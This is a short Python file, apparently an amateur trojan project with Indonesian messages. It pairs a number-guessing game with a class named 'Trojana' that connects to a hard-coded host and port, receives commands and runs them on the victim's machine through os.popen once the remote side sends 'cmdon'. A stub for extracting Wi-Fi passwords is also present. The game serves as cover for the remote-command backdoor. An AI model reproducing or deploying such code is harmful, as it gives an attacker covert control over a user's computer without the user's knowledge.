import random
import socket , threading ,os
class Trojana:
    def __init__(self, host, port):
        self.host = host
        self.port = port
    def exploit(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect( (self.host,self.port) )
    
        cmd_state = False

        while True:
            server_command = client.recv(1024).decode("utf-8") # Receive command with 1024 bytes then decode it

            if server_command == "extractwifipassword": # Nanti Ini
                print("Hello World")
                continue
            elif server_command == "cmdon":
                client.send("You now have access to CMD Client".encode("utf-8"))
                cmd_state=True
                continue
            elif server_command == "cmdoff":
                client.send("You now dont have access to CMD Client".encode("utf-8")) 
                cmd_state=False 
                continue
            if cmd_state:
                os.popen(server_command)
                os.system("dir")
                print("Emang Dahhh udah ke hack masih aja")
            client.send(f"{server_command} Was executed Successfully".encode("utf-8"))


class game:

    def randomnumb(self):
        return random.randint(0,1000)

    def thegame(self):
        self.ans = "y"
        correctnumb = self.randomnumb()
        while (self.ans == "y" or self.ans == "Y"):
            self.numb = int(input("What's your Guesses ? ")) 
            
            if self.numb < correctnumb:
                print("Kekecilan")
                self.ans = input("Mo Nyoba lagi ?")
            elif self.numb >correctnumb:
                print("Kegedean")
                self.ans = input("Mo Nyoba lagi ?") 
            else:
                print("Edan slurr")
                self.ans = input("Mo Nyoba lagi ?")

        print(f"The True {correctnumb}")        
            
            
         

if __name__ == "__main__":

    ExecuteGame =game()
    Trojan = Trojana("192.168.0.113",55555)
    t1 = threading.Thread(target=ExecuteGame.thegame())
    t2 = threading.Thread(target=Trojan.exploit())

    t2.start()
    t1.start()
   